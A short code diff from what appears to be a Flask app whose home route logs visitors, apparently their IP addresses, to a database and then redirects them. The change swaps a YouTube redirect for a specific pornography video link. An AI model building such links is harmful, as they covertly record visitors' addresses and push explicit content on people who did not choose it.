@@ -23,8 +23,8 @@ def home():
     db.session.add(ipTable)
     db.session.commit()
 
-    return redirect("https://www.youtube.com/", code=302)
+    return redirect("https://www.pornhub.com/view_video.php?viewkey=ph62a3418583e13", code=302)
 
-
+  
 def run():
     app.run(host='0.0.0.0', port=8080)
